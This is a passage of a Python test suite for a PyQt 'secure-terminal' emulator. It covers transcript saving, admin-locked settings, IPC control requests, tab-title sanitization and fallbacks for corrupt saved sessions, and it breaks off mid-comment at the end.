    os.close(_tfd)
    os.unlink(_tpath)                       # remove it: save_transcript must (re)create
    QFileDialog.getSaveFileName = staticmethod(lambda *_a, **_k: (_tpath, ''))
    win.save_transcript()
    ok(os.path.exists(_tpath) and os.path.getsize(_tpath) > 0,
       'save_transcript: creates the file and writes the transcript to it')
    # stale-term across the modal: the tab's shell can exit DURING the save dialog,
    # whose _on_shell_exited->close_tab deleteLater()s the term; term.transcript_text()
    # on the freed C++ object then crashes. The _tab_is_live re-check must skip it.
    win.new_tab()
    _sv_term = win.current()
    _sv_term.has_foreground_program = lambda: False   # close_tab needs no confirm
    _sv_term.shutdown = lambda: None                   # avoid the ipc-reaper race
    _sv_path = os.path.join(tempfile.mkdtemp(), 'stale.txt')
    def _save_kills_tab(*_a, **_k):
        win.close_tab(win.tabs.indexOf(_sv_term))      # shell exits mid-dialog
        APP.processEvents()                            # let deleteLater free it
        return (_sv_path, '')
    QFileDialog.getSaveFileName = staticmethod(_save_kills_tab)
    win.save_transcript()                              # must NOT crash (guarded)
    ok(not os.path.exists(_sv_path),
       'save_transcript: a tab deleted during the dialog is skipped -- no crash, no write')
finally:
    QFileDialog.getSaveFileName = _ogsf

# --- open_transcript: writes the transcript under the XDG state dir + opens it -----------
# (NOT /tmp: the shipped AppArmor profile allows ~/.local/state/secure-terminal/** but not
# /tmp; a fixed reused file so history does not accumulate.)
from PyQt6.QtGui import QDesktopServices as _QDS         # noqa: E402
import secure_terminal.session as _sess                  # noqa: E402
_oou = _QDS.openUrl
_osd = _sess._state_dir
_opened = []
_state_tmp = tempfile.mkdtemp(prefix='st-transcript-state-')
try:
    def _spy_open_url(url):
        _opened.append(url.toLocalFile())
        return True
    _QDS.openUrl = staticmethod(_spy_open_url)
    _sess._state_dir = lambda: _state_tmp
    _ocur = win.current
    win.current = lambda: None                  # no active tab -> no-op
    win.open_transcript()
    ok(_opened == [], 'open_transcript: no active tab is a no-op')
    win.current = _ocur
    win.open_transcript()
    ok(len(_opened) == 1 and os.path.dirname(_opened[0]) == _state_tmp
       and os.path.basename(_opened[0]) == 'transcript.txt'
       and os.path.getsize(_opened[0]) > 0,
       'open_transcript: writes transcript.txt under the state dir and opens it')
    win.open_transcript()                        # a second open REUSES the one file (no leak)
    ok(len(_opened) == 2 and _opened[0] == _opened[1],
       'open_transcript: reuses one file rather than leaking a new temp each time')
    # C (ai-review): an OSError on the write must NOT propagate out of the Qt slot and
    # take the whole window (all tabs) down -- mirror save_transcript's try/except. An
    # unwritable state dir (makedirs raises under /proc) must be swallowed silently.
    _opened.clear()
    _sess._state_dir = lambda: '/proc/nonexistent-dir/state'
    win.open_transcript()                        # must NOT raise
    ok(_opened == [],
       'C: open_transcript swallows an OSError (no window-killing crash), opens nothing')
    _sess._state_dir = lambda: _state_tmp
finally:
    _QDS.openUrl = _oou
    _sess._state_dir = _osd

# --- _test_canary: writes the marker + echoes; loud failure on a bad path -----
import secure_terminal.main as _MM              # noqa: E402
eq(_test_canary(), 0, '_test_canary: writes the marker and returns 0')
_orig_marker = _MM.canary_marker_path
try:
    _MM.canary_marker_path = lambda: '/proc/nonexistent-dir/marker'
    eq(_test_canary(), 1, '_test_canary: an unwritable marker fails loud (exit 1)')
finally:
    _MM.canary_marker_path = _orig_marker

# --- setting appliers: the apply path and the admin-locked early return --------
win.set_auto_tab_colors(True)
win.set_auto_tab_colors(False)
win.set_markings(True)
win.set_clipboard_read_always(True)
win.set_scrollback(1000)
win.set_paste_delay(3)
win.set_bell_sound('')                      # empty/disallowed -> cleared, applied
ok(win._scrollback == 1000 and win._paste_delay == 3,
   'setting appliers apply the change to the window (scrollback + paste delay)')

# line editing: the live per-tab setter pushes into the current tab, flips the menu
# action and updates the default used for new tabs.
win.set_line_edits(False)
eq(win.current().line_edits_enabled(), False,
   'set_line_edits(False) reaches the current tab')
ok(not win.act_line_edits.isChecked(), 'set_line_edits syncs the menu action')
eq(win._default_line_edits, False, 'set_line_edits updates the new-tab default')
win.set_line_edits(True)
eq(win.current().line_edits_enabled(), True, 'set_line_edits(True) restores it')

_saved_locked = set(win._locked)
_saved_bsl = win._bell_sound_locked
try:
    win._locked = {'auto_tab_colors'}
    win.set_auto_tab_colors(True)           # locked -> early return
    win._locked = {'colored_markings'}
    win.set_markings(True)
    win._locked = {'osc_clipboard_read_always'}
    win.set_clipboard_read_always(True)
    win._bell_sound_locked = lambda: True
    win.set_bell_sound('/etc/hostname')     # locked -> early return
    win._locked = {'copy_warn'}
    win.set_copy_warn('always')             # locked -> early return
    _lk_copy = win.current().current_copy_warn()
    win._locked = {'line_edits'}
    win.set_line_edits(False)               # locked -> early return
    eq(win._default_line_edits, True,
       'a locked line_edits cannot be turned off by the user')
    ok(win._default_bell_sound != '/etc/hostname' and _lk_copy != 'always',
       'admin locks refuse bell_sound and copy_warn too (read-back, no change)')
    # a locked paste_warn / copy_warn is greyed out in the menu, not silently
    # clickable-but-ignored.
    win._locked = {'copy_warn', 'paste_warn'}
    win._apply_locks()
    ok(all(not a.isEnabled() for a in win._copy_warn_actions.values())
       and all(not a.isEnabled() for a in win._paste_warn_actions.values()),
       'a locked paste_warn / copy_warn greys out its menu actions')
    # a locked zoom greys its View-menu actions too (its setter already refuses,
    # so an enabled-but-no-op click would only mislead), matching the zoom_box.
    win._locked = {'zoom'}
    win._apply_locks()
    ok(not win.act_zin.isEnabled() and not win.act_zout.isEnabled()
       and not win.act_zreset.isEnabled(),
       'a locked zoom greys out its View-menu Zoom In/Out/Reset actions')
    # a locked font_family greys the View > Font action: its setter (set_font_family)
    # refuses a locked change, so an enabled trigger would open the picker and then
    # silently discard the pick -- a UI that lies. Same class as the greyed zoom
    # triggers. Fails on the pre-fix _apply_locks (act_font was never gated).
    win._locked = {'font_family'}
    win._apply_locks()
    ok(not win.act_font.isEnabled(),
       'a locked font_family greys out the View > Font action')
    # a locked osc_notice_off greys the per-TYPE notice toggles: set_osc_notice_type
    # refuses a locked change, so an enabled tick would never apply -- a UI that lies.
    # Fails on the pre-fix _apply_locks (the per-type actions were never gated).
    win._locked = {'osc_notice_off'}
    win._apply_locks()
    ok(win._osc_notice_actions
       and all(not a.isEnabled() for a in win._osc_notice_actions.values()),
       'a locked osc_notice_off greys out the per-type OSC-notice toggles')
finally:
    win._locked = _saved_locked
    win._bell_sound_locked = _saved_bsl
    for _a in (list(win._copy_warn_actions.values())
               + list(win._paste_warn_actions.values())
               + list(win._osc_notice_actions.values())
               + [win.act_zin, win.act_zout, win.act_zreset, win.act_font]):
        _a.setEnabled(True)             # undo the lock disable for later tests

# --- the tray context menu is built from fixed, safe actions ------------------
_tray_menu = win._build_tray_menu()
ok(_tray_menu is not None and len(_tray_menu.actions()) >= 3,
   '_build_tray_menu: builds the fixed Show/Hide, New Tab, Quit menu')

# --- the find bar: search, step, and its key handling -------------------------
from PyQt6.QtGui import QKeyEvent                                # noqa: E402
from PyQt6.QtCore import Qt, QEvent                              # noqa: E402
from PyQt6.QtWidgets import QSystemTrayIcon                      # noqa: E402

win.show_find()
win._find_bar.input.setText('a')
win._find_update()
win._find_bar.case.setChecked(True)
win._find_bar.all_tabs.setChecked(True)
win._find_update()
win._find_step(False)
win._find_step(True)


def _fbkey(qtkey, mods=Qt.KeyboardModifier.NoModifier):
    win._find_bar.keyPressEvent(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, ''))


_fbkey(Qt.Key.Key_Return)
_fbkey(Qt.Key.Key_Return, Qt.KeyboardModifier.ShiftModifier)   # backward
_fbkey(Qt.Key.Key_A)                        # a plain key -> passed to super
_fbkey(Qt.Key.Key_Escape)                   # -> hide_find
ok(win._find_bar.isHidden(),                # isHidden(): own state, not the unshown parent's
   'find bar: Esc hides it (search/stepping/Return also exercised above)')

# --- the system-tray icon: disabled, unavailable, and created -----------------
_o_avail = QSystemTrayIcon.isSystemTrayAvailable
_o_systray = win._systray
try:
    win._systray = False
    ok(win._tray_icon() is None, 'tray: disabled in settings -> None')
    win._systray = True
    win._tray = None
    QSystemTrayIcon.isSystemTrayAvailable = staticmethod(lambda: False)
    ok(win._tray_icon() is None, 'tray: no platform tray -> None')
    QSystemTrayIcon.isSystemTrayAvailable = staticmethod(lambda: True)
    win._tray = None
    win._tray_icon()                        # -> creates + shows the tray icon
    ok(win._tray is not None, 'tray: created when enabled and available')
finally:
    QSystemTrayIcon.isSystemTrayAvailable = _o_avail
    win._systray = _o_systray

# --- copy/paste/zoom + input-dialog actions routed through the current tab -----
from PyQt6.QtWidgets import QInputDialog, QSystemTrayIcon        # noqa: E402

win.copy_selection()
win.paste_clipboard()
win.zoom_in()
win.zoom_out()
win._on_zoom_step(1)
ok(True, 'copy/paste/zoom route through the current tab')

_ogt = QInputDialog.getText
try:
    _ntr0 = win.tabs.count()
    QInputDialog.getText = staticmethod(lambda *_a, **_k: ('', False))
    win.new_tab_running()                   # cancelled -> no new tab
    win.show_command_palette()              # cancelled
    _ntr_cancel = win.tabs.count()
    QInputDialog.getText = staticmethod(lambda *_a, **_k: ('echo hi', True))
    win.new_tab_running()                   # -> new_tab('echo hi')
    win.show_command_palette()              # -> run_command('echo hi')
    ok(_ntr_cancel == _ntr0 and win.tabs.count() > _ntr_cancel,
       'new_tab_running opens a tab for a provided command, none when cancelled')
    # stale-term across the modal: the tab's shell can exit DURING QInputDialog.getText,
    # whose _on_shell_exited->close_tab deleteLater()s the term; a stale
    # _refresh_tab_label then indexOf()s the freed C++ object and crashes. The
    # _tab_is_live re-check must skip it.
    win.new_tab()
    _rn_term = win.current()
    _rn_term.has_foreground_program = lambda: False    # close_tab needs no confirm
    _rn_term.shutdown = lambda: None                    # avoid the ipc-reaper race
    _rn_idx = win.tabs.indexOf(_rn_term)
    def _rename_kills_tab(*_a, **_k):
        win.close_tab(win.tabs.indexOf(_rn_term))       # shell exits mid-modal
        APP.processEvents()                             # let deleteLater free it
        return ('newname', True)
    QInputDialog.getText = staticmethod(_rename_kills_tab)
    win.rename_tab(_rn_idx)                              # must NOT crash (guarded)
    # behavioural check (a dead term does not always hard-crash offscreen): the guard
    # SKIPS the rename, so the removed term never gets a stale _user_titles entry (nor
    # a _refresh_tab_label(term) that would indexOf a freed C++ object in production).
    ok(_rn_term not in win._user_titles,
       'rename_tab: a tab deleted during the modal is skipped, not renamed (stale-term guard)')
finally:
    QInputDialog.getText = _ogt

# move the current tab left/right (needs more than one tab; wraps)
while win.tabs.count() < 2:
    win.new_tab()
_mv_term = win.tabs.currentWidget()
_mv_i0 = win.tabs.indexOf(_mv_term)
win._on_tab_move(1)
_mv_i1 = win.tabs.indexOf(_mv_term)
win._on_tab_move(-1)
ok(_mv_i1 != _mv_i0 and win.tabs.indexOf(_mv_term) == _mv_i0,
   'the current tab moves left/right and returns (wrap-around)')

# pwd-as-tab-title (#90): with no explicit name and no program title, the tab
# label is the working-directory basename (kept live by the fg poll), not a static
# "shell". A set name or program title still wins; an unreadable cwd -> "shell".
_pw = win.current()
_pw_cwd = _pw.cwd_basename
_pw.cwd_basename = lambda: 'myproj'
win._user_titles.pop(_pw, None)
win._prog_titles.pop(_pw, None)
win._refresh_tab_label(_pw)
eq(win.tabs.tabText(win.tabs.indexOf(_pw)), 'myproj',
   '#90: no explicit title -> the tab shows the pwd basename')
# a raw cwd basename is a legal Linux dir name and can carry bidi/control (e.g.
# $'a\u202eb'); it must be sanitized before reaching the tab bar, like every other
# label source -- else it flashes an RLO/control glyph live as you cd around.
_pw.cwd_basename = lambda: 'a\u202eb'
win._refresh_tab_label(_pw)
ok('\u202e' not in win.tabs.tabText(win.tabs.indexOf(_pw)),
   'the live cwd basename is sanitized in the tab label (no bidi/control flash)')
_pw.cwd_basename = lambda: 'myproj'
win._user_titles[_pw] = 'Named'
win._refresh_tab_label(_pw)
eq(win.tabs.tabText(win.tabs.indexOf(_pw)), 'Named',
   '#90: an explicit tab name overrides the pwd basename')
win._user_titles.pop(_pw, None)
_pw.cwd_basename = lambda: None
win._refresh_tab_label(_pw)
eq(win.tabs.tabText(win.tabs.indexOf(_pw)), 'shell',
   '#90: an unreadable cwd falls back to "shell"')
_pw.cwd_basename = _pw_cwd
# the tab tooltip escapes an untrusted program title: setTabToolTip renders rich text
# (unlike setTabText), so an OSC-set title with markup must be shown literally.
# Pre-fix the raw '<b>' reached the tooltip.
win._user_titles.pop(_pw, None)
win._prog_titles[_pw] = '<b>owned</b>'
win._refresh_tab_label(_pw)
_tip = win.tabs.tabToolTip(win.tabs.indexOf(_pw))
ok('<b>' not in _tip and '&lt;b&gt;owned&lt;/b&gt;' in _tip,
   'tab tooltip escapes an untrusted program title (no raw markup)')
win._prog_titles.pop(_pw, None)
win._refresh_tab_label(_pw)

# a program-set title updates the tab label; window visibility + tray trigger
win._on_tab_title(win.current(), 'a program title')
win.show()
win._toggle_window_visibility()             # visible -> hide
win._toggle_window_visibility()             # hidden -> restore
win._on_tray_activated(QSystemTrayIcon.ActivationReason.Trigger)
ok(win._prog_titles.get(win.current()) == 'a program title',
   'a program-set title is stored for the tab (visibility toggle + tray also run)')

# a tab whose shell exits is closed; an unknown term is ignored
win.new_tab()
_victim_tab = win.tabs.widget(win.tabs.count() - 1)
_n_before = win.tabs.count()
win._on_shell_exited(_victim_tab)
ok(win.tabs.count() == _n_before - 1, '_on_shell_exited closes the tab whose shell ended')
win._on_shell_exited(win.current())         # called again is harmless
ok(True, '_on_shell_exited on the current tab is handled')

# --- the current-tab actions are safe no-ops when there is no current tab -----
w3 = MainWindow()
while w3.tabs.count():
    w3.tabs.removeTab(0)                     # empty it without closing the window
ok(w3.current() is None, 'a window with no tabs has no current tab')
w3.copy_selection()
w3.paste_clipboard()
w3.zoom_in()
w3.zoom_out()
w3._on_zoom_step(-1)
w3.set_markings(True)                        # current() None -> apply skipped
w3.set_tui(True)
w3.save_transcript()                         # current() None -> returns before any dialog
ok(True, 'current-tab actions are harmless no-ops with no tab open')
w3.deleteLater()
APP.processEvents()

# --- a keybindings drop-in drives the custom-shortcut parse at startup ---------
_cfgd = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgd, exist_ok=True)
with open(os.path.join(_cfgd, '90-keys.conf'), 'w', encoding='utf-8') as _kf:
    _kf.write('keybindings=find=Ctrl+Shift+G new_tab=Ctrl+Shift+T copy=Ctrl+C\n')
_wk = MainWindow()
ok(True, 'a keybindings drop-in is parsed when the window starts')
# a NON-reserved override (Ctrl+Shift+G -- a Ctrl+Shift combo the terminal does not
# forward) is applied, proving the reserved-drop below does not block legitimate rebinds...
eq(_wk._shortcuts['find'][0].shortcut().toString(), 'Ctrl+Shift+G',
   'a non-reserved keybindings override (find=Ctrl+Shift+G) is applied at startup')
# ...but a RESERVED override (copy=Ctrl+C) is DROPPED to the default -- _bind must honor
# _is_reserved_shortcut like the Shortcuts dialog, so a hand-edited config cannot remap the
# terminal's SIGINT key (#18 HIGH).
eq(_wk._shortcuts['copy'][0].shortcut().toString(), _wk._shortcuts['copy'][1],
   '_bind drops a reserved keybindings override back to the default')
ok(_wk._shortcuts['copy'][0].shortcut().toString() != 'Ctrl+C',
   'a config keybindings= cannot rebind Ctrl+C away from the running program')
_wk.deleteLater()
APP.processEvents()

# --- the single-instance IPC server: request dispatch + ctl/open/restore ------
import json as _json                                            # noqa: E402

if win.tabs.count() == 0:
    win.new_tab()
_tab0 = win.tabs.widget(0)
_tid0 = win._tab_ids.get(_tab0)
_title0 = win.tabs.tabText(0)


def _disp(req):
    return win._dispatch_request(_json.dumps(req).encode('utf-8'))


ok(not win._dispatch_request(b'not json at all')['ok'],
   'ipc: unparseable request bytes are rejected')
# #2: json.loads raises RecursionError (not ValueError) on deeply-nested input; uncaught it
# escapes the Qt readyRead slot and aborts the whole instance -- a same-UID control-socket
# DoS. _dispatch_request must catch it and return a malformed reply, not raise.
_deep_raised = None
try:
    _deep = win._dispatch_request(b'[' * 100000)
except RecursionError as _e:
    _deep_raised, _deep = _e, None
ok(_deep_raised is None and isinstance(_deep, dict) and not _deep['ok'],
   '#2: a deeply-nested control-socket request is rejected as malformed, not a RecursionError crash')
ok(not _disp(['not', 'a', 'dict'])['ok'], 'ipc: a non-dict request is rejected')
_rp = _disp({'op': 'ping'})
ok(_rp['ok'] and 'pid' in _rp, 'ipc: ping replies ok + pid')
ok(not _disp({'op': 'no-such-op'})['ok'], 'ipc: an unknown op is rejected')

_saved_rc = win._remote_control
try:
    win._remote_control = False
    ok(not _disp({'op': 'ctl-ls'})['ok'],
       'ipc: a ctl op is refused when remote control is disabled')
    win._remote_control = True
    ok(_disp({'op': 'ctl-ls'})['ok'], 'ipc: ctl-ls lists the tabs')
    ok(not _disp({'op': 'ctl-send-text', 'tab': 'id:999999', 'text': 'x'})['ok'],
       'ipc: a ctl op on a non-matching tab -> error')
    ok(_disp({'op': 'ctl-send-text', 'tab': 'id:%d' % _tid0, 'text': 'echo\n'})['ok'],
       'ipc: ctl-send-text to a matched tab')
    ok(not _disp({'op': 'ctl-send-text', 'tab': 'id:%d' % _tid0, 'text': 5})['ok'],
       'ipc: ctl-send-text with non-string text is rejected')
    _rd = _disp({'op': 'ctl-dump-tab', 'tab': 'id:%d' % _tid0, 'lines': 2})
    ok(_rd['ok'] and 'text' in _rd, 'ipc: ctl-dump-tab returns the rendered text')
    ok(_disp({'op': 'ctl-set-tab-title', 'tab': 'title:%s' % _title0,
              'title': 'Renamed'})['ok'],
       'ipc: ctl-set-tab-title matched by title')
    # SEC-3: a user/IPC-set title bypasses the program-title sanitizer, so the write site
    # must strip bidi/homoglyph -- else an RLO override spoofs the tab label, the bell
    # notification and the OSC-52 consent dialog, which all read _user_titles.
    ok(_disp({'op': 'ctl-set-tab-title', 'tab': 'id:%d' % _tid0,
              'title': 'a\u202eb'})['ok'], 'ipc: ctl-set-tab-title with a bidi title accepted')
    ok('\u202e' not in win._user_titles.get(_tab0, ''),
       'SEC-3: a ctl-set-tab-title bidi/RLO override is sanitized out at the write site')
    ok(not _disp({'op': 'ctl-set-tab-title', 'tab': 'id:%d' % _tid0,
                  'title': 5})['ok'],
       'ipc: ctl-set-tab-title with a non-string title is rejected')

    # --- ctl-zoom: live font-zoom a tab (no restart) -------------------------
    _z_cur = win.current()
    _z_cur_tid = win._tab_ids.get(_z_cur)
    win.set_zoom(100)                       # known baseline on the current tab
    # explicit percent on the CURRENT tab -> routed through set_zoom, so the
    # toolbar zoom box + persisted default track it too.
    _rz = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 150})
    ok(_rz['ok'] and _rz['zoom'] == 150 and _z_cur.current_zoom() == 150,
       'ipc: ctl-zoom explicit percent applies to the tab')
    ok(win.zoom_box.value() == 150,
       'ipc: ctl-zoom on the current tab routes through set_zoom (zoom box tracks it)')
    # in / out step by ZOOM_STEP.
    _ri = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 'in'})
    ok(_ri['ok'] and _ri['zoom'] == 160, 'ipc: ctl-zoom in steps up by ZOOM_STEP')
    _ro = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 'out'})
    ok(_ro['ok'] and _ro['zoom'] == 150, 'ipc: ctl-zoom out steps down by ZOOM_STEP')
    # reset -> 100.
    _rr0 = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 'reset'})
    ok(_rr0['ok'] and _rr0['zoom'] == 100, 'ipc: ctl-zoom reset returns to 100')
    # clamp to ZOOM_MIN..ZOOM_MAX.
    _rh = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 500})
    ok(_rh['ok'] and _rh['zoom'] == 400,
       'ipc: ctl-zoom clamps above ZOOM_MAX (500 -> 400)')
    _rlo = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid, 'level': 5})
    ok(_rlo['ok'] and _rlo['zoom'] == 25,
       'ipc: ctl-zoom clamps below ZOOM_MIN (5 -> 25)')
    win.set_zoom(100)
    # a non-numeric level is rejected.
    ok(not _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid,
                  'level': 'huge'})['ok'],
       'ipc: ctl-zoom with a non-numeric level is rejected')
    # a raw-JSON float infinity (a ctl request with level 1e400 parses to inf) makes
    # int(inf) raise OverflowError: it must be caught + rejected, never crash the Qt
    # process. On the old except (no OverflowError) _disp would raise, not return.
    ok(not _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid,
                  'level': float('inf')})['ok'],
       'ipc: ctl-zoom with an infinite level (JSON 1e400) is rejected, not a crash')
    # a non-matching tab -> error.
    ok(not _disp({'op': 'ctl-zoom', 'tab': 'id:999999', 'level': 150})['ok'],
       'ipc: ctl-zoom on a non-matching tab -> error')
    # a NON-current tab -> apply_zoom (NOT set_zoom): the tab's own zoom changes,
    # but the toolbar zoom box (which reflects the CURRENT tab) does not track it.
    while win.tabs.count() < 2:
        win.new_tab()
    _z_other = next(win.tabs.widget(_i) for _i in range(win.tabs.count())
                    if win.tabs.widget(_i) is not win.current())
    _z_other_tid = win._tab_ids.get(_z_other)
    win.set_zoom(100)
    _z_box_before = win.zoom_box.value()
    _ron = _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_other_tid, 'level': 175})
    ok(_ron['ok'] and _z_other.current_zoom() == 175,
       'ipc: ctl-zoom on a non-current tab applies to that tab')
    ok(win.zoom_box.value() == _z_box_before and win.current().current_zoom() == 100,
       'ipc: ctl-zoom on a non-current tab uses apply_zoom (current-tab chrome unchanged)')
    # admin-locked zoom is refused.
    _z_lk = set(win._locked)
    win._locked = {'zoom'}
    ok(not _disp({'op': 'ctl-zoom', 'tab': 'id:%d' % _z_cur_tid,
                  'level': 200})['ok'],
       'ipc: ctl-zoom refused when zoom is admin-locked')
    win._locked = _z_lk
    win.set_zoom(100)
finally:
    win._remote_control = _saved_rc

# open (the server side of a --reuse handoff)
ok(win._ipc_open({'tabs': [{'title': 'opened', 'mode': 'box'}]})['ok'],
   'ipc: open creates the requested tabs')
# --reuse always asks for a new tab, so a bare reuse (no specs) opens a fresh
# default tab -- it never leaves the running instance unchanged (the old
# behaviour, which only added a tab when the window had none, was the bug: a
# bare relaunch did nothing). Assert the tab count actually grew.
_before_bare = win.tabs.count()
win._ipc_open({'tabs': 'not-a-list'})       # opened 0 -> a new default tab
ok(win.tabs.count() == _before_bare + 1,
   'ipc: a bare reuse opens a NEW default tab (count grows by one)')

# open: cap the tab count per frame. ~58k tiny specs fit in the 1 MiB IPC frame and
# would exhaust fds/memory, so a frame past the cap is refused whole. The gate is on
# the list LENGTH, so the spec contents are irrelevant (None keeps the check cheap).
_before_cap = win.tabs.count()
_rcap = win._ipc_open({'tabs': [None] * (_MM._MAX_OPEN_TABS + 1)})
ok(not _rcap['ok'] and 'too many' in _rcap['error'],
   'ipc: an over-cap open frame is refused, not opened')
ok(win.tabs.count() == _before_cap,
   'ipc: a refused over-cap frame opens no tabs')

# open --if-absent: idempotent open that dedups by COMMAND (what open-all relies
# on). _normalize_command: a -e STRING and its shell-split argv are equal; None (a
# plain shell tab) is never a dedup key.
_nc = MainWindow._normalize_command
ok(_nc('echo a b') == ('echo', 'a', 'b') == _nc(['echo', 'a', 'b']),
   'if_absent: a -e string and its argv normalize equal')
ok(_nc(None) is None and _nc('') == (),
   'if_absent: None (a shell) is never a dedup key')
ok(_nc('"unbalanced') == ('"unbalanced',),
   'if_absent: a command that will not shell-split falls back to the raw string')
# a command LIST with an unhashable element must not crash the dedup: elements are
# str()-coerced so the key is always hashable (an IPC payload can carry such a list).
ok(_nc(['echo', ['nested']]) == ('echo', "['nested']"),
   'if_absent: list command elements are str()-coerced to a hashable key')
try:
    _ru = win._ipc_open({'tabs': [{'command': ['echo', ['nested']]}], 'if_absent': True})
    ok(_ru['opened'] == 1,
       'if_absent: an unhashable command element does not crash _ipc_open')
except TypeError:
    ok(False, 'if_absent: an unhashable command element crashed _ipc_open (TypeError)')
# seed a live tab's command; an if_absent open of the SAME command is skipped and
# adds no tab (nor a bare default tab) -- fully idempotent.
_tab0.launch_command = _nc('seeded-if-absent-canary --flag')
_before_if = win.tabs.count()
_rs = win._ipc_open({'tabs': [{'command': 'seeded-if-absent-canary --flag'}],
                     'if_absent': True})
ok(_rs['opened'] == 0 and _rs['skipped'] == 1,
   'if_absent: a command already running in a tab is skipped')
ok(win.tabs.count() == _before_if,
   'if_absent: a fully-skipped open adds no tab (idempotent, no default tab)')
# the argv form of the seeded string command matches too
_ra = win._ipc_open({'tabs': [{'command': ['seeded-if-absent-canary', '--flag']}],
                     'if_absent': True})
ok(_ra['skipped'] == 1, 'if_absent: matches the argv form against the seeded string')
# a stale _tab_ids entry no longer in the bar is ignored by _live_commands (it does
# not crash the scan nor mask the real match).
from PyQt6.QtWidgets import QWidget                             # noqa: E402
_orphan = QWidget()
win._tab_ids[_orphan] = 999999
try:
    _ro = win._ipc_open({'tabs': [{'command': 'seeded-if-absent-canary --flag'}],
                         'if_absent': True})
    ok(_ro['skipped'] == 1,
       'if_absent: a _tab_ids entry not in the bar is skipped by _live_commands')
finally:
    del win._tab_ids[_orphan]
# a non-dict tab spec is skipped; a valid spec in the same batch still opens.
_before_nd = win.tabs.count()
win._ipc_open({'tabs': [42, {'title': 'nd'}]})
ok(win.tabs.count() == _before_nd + 1,
   'ipc: a non-dict tab spec is skipped, the valid one still opens')
# two specs sharing a NEW command in one batch: the first opens (dedup set grows),
# the duplicate second is skipped -- intra-batch idempotency.
_rb = win._ipc_open({'tabs': [{'command': ['cat']}, {'command': 'cat'}],
                     'if_absent': True})
ok(_rb['opened'] == 1 and _rb['skipped'] == 1,
   'if_absent: a command repeated within one batch opens once, skips the rest')
# without if_absent the same command opens a duplicate (default behaviour intact)
_before_dup = win.tabs.count()
win._ipc_open({'tabs': [{'command': 'seeded-if-absent-canary --flag'}]})
ok(win.tabs.count() == _before_dup + 1,
   'if_absent off: a duplicate command still opens (unchanged default)')

# _restore_tab: rebuild a tab from saved session state (bad ints fall back)
win._restore_tab({'text': 'hi', 'theme': 'dark', 'zoom': 'notanint',
                  'scrollback': 'nope', 'mode': 'box', 'osc': {},
                  'font_family': 123, 'font_size': 'invalid'})
_bad_tab = win.current()
win._restore_tab({'allow_title': True, 'bell': 'audible'})   # legacy pre-OSC path
ok(True, '_restore_tab rebuilds a tab and tolerates bad zoom/scrollback values')
# a TAMPERED boolean flag (a JSON string/number, not a real bool) must NOT coerce
# truthy via bool() and fail OPEN -- it falls back to the default (#5). "false" is a
# non-empty string (bool("false") is True), the classic fail-open value.
win._restore_tab({'tui': 'false'})
ok(win.current().tui_active() is False,
   'a non-bool saved flag falls back to the default, not bool()-coerced True (#5)')
# (OSC-map fail-closed restore is tested at the END of this module, after the
# ctl-dump-tab COR-7 assertions, so its probe tab cannot perturb their fixture.)
# a corrupt/hand-edited session with a non-str font_family or non-int font_size must
# fall back to the default, not crash the restore (.strip() / int() on a bad type).
eq(_bad_tab.current_font_family(), win._default_font_family,
   '_restore_tab falls back to the default font family on a non-string saved value')
eq(_bad_tab.current_font_size(), win._default_font_size,
   '_restore_tab falls back to the default font size on a non-int saved value')
# a JSON number like 1e400 parses to float('inf'), and int(inf) raises OverflowError
# (NOT TypeError/ValueError) -- the same class guarded for ctl-zoom. A corrupt session
# with an infinite zoom/font_size/scrollback must fall back, not crash the restore at
# startup. On the old except (no OverflowError) _restore_tab raised, aborting launch.
win._restore_tab({'text': '', 'zoom': 1e400, 'font_size': 1e400,
                  'scrollback': 1e400, 'osc': {}})
_inf_tab = win.current()
eq(_inf_tab.current_zoom(), win._default_zoom,
   '_restore_tab falls back to the default zoom on an infinite (1e400) saved value')
eq(_inf_tab.current_font_size(), win._default_font_size,
   '_restore_tab falls back to the default font size on an infinite (1e400) saved value')
eq(_inf_tab.current_scrollback(), win._scrollback,
   '_restore_tab falls back to the default scrollback on an infinite (1e400) saved value')
# a valid but OUT-OF-RANGE scrollback int (99999999999) survives _saved_int's int() (no
# OverflowError there -- it is a real int), but would overflow apply_scrollback ->
# setMaximumBlockCount's C int32 and crash the restore. Outside the int32 range it falls
# back to the default -- the magnitude path, distinct from 1e400 (an in-range custom value
# like 1500 is still honoured, per the unlocked-scrollback test below).
win._restore_tab({'text': '', 'scrollback': 99999999999, 'osc': {}})
_big_tab = win.current()
eq(_big_tab.current_scrollback(), win._scrollback,
   '_restore_tab falls back to the default scrollback on an out-of-range (99999999999) saved value, not a crash')
# an unhashable saved theme (a JSON array/object) must not crash the membership test
# (THEMES is a dict); it falls back to the default theme.
win._restore_tab({'text': '', 'theme': [], 'osc': {}})
eq(win.current().current_theme(), win._default_theme,
   '_restore_tab falls back to the default theme on an unhashable saved value')

# a restored tab spawns its shell in the SAVED cwd (bug: pwd was not restored)
_rcwd = tempfile.mkdtemp(prefix='st-restore-cwd-')
win._restore_tab({'text': '', 'cwd': _rcwd, 'osc': {}})
_rterm = win.current()
_rok = False
for _ in range(60):
    try:
        if os.path.realpath(os.readlink('/proc/%d/cwd' % _rterm._pid)) \
                == os.path.realpath(_rcwd):
            _rok = True
            break
    except OSError:
        ## /proc/<pid>/cwd is not readable until the forked child has chdir'd
        ## and exec'd; poll on, the loop's own tries budget is the timeout.
        pass
    pump(10)
ok(_rok, '_restore_tab spawns the restored tab in its saved cwd')
# a vanished saved cwd still restores (falls back, no crash)
win._restore_tab({'text': '', 'cwd': '/no/such/dir/for/restore', 'osc': {}})
ok(win.current()._pid is not None,
   '_restore_tab with a vanished saved cwd still spawns a shell')

# session restore honours admin locks: a session saved BEFORE a lock was applied
# must not reopen bypassing it. _restore_tab applied the saved per-tab settings
